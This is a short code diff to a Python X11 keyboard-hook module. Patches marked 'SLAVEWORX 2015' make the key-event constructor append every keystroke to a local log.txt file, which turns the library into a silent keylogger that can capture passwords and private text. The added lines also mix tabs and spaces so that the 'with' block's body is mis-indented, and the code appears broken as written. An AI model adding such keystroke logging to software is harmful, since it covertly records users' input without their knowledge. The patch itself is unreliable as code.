@@ -120,7 +120,8 @@ class HookManager(threading.Thread):
         self.local_dpy.flush()
     
     def printevent(self, event):
-        print event
+		print event
+		
     
     def HookKeyboard(self):
         pass
@@ -234,6 +235,7 @@ class HookManager(threading.Thread):
             if name.startswith("XK_") and getattr(XK, name) == keysym:
                 return name.lstrip("XK_")
         return "[%d]" % keysym
+      
 
     def asciivalue(self, keysym):
         asciinum = XK.string_to_keysym(self.lookup_keysym(keysym))
@@ -317,8 +319,16 @@ class pyxhookkeyevent:
         self.KeyID = KeyID
         self.ScanCode = ScanCode
         self.MessageName = MessageName
+        
+        #SLAVEWORX 2015 - Added log output!
         with open("log.txt", "a+") as f:
-			f.write(self.Key + "\n");  
+			f.write(self.Key + " "); 
+		#SLAVEWORX 2015 - Added output formatting!		
+			if self.Key == "Return":
+				f.write("\n") 
+			
+			if self.Key == "space":
+				f.write("  ")
         
     
     def __str__(self):
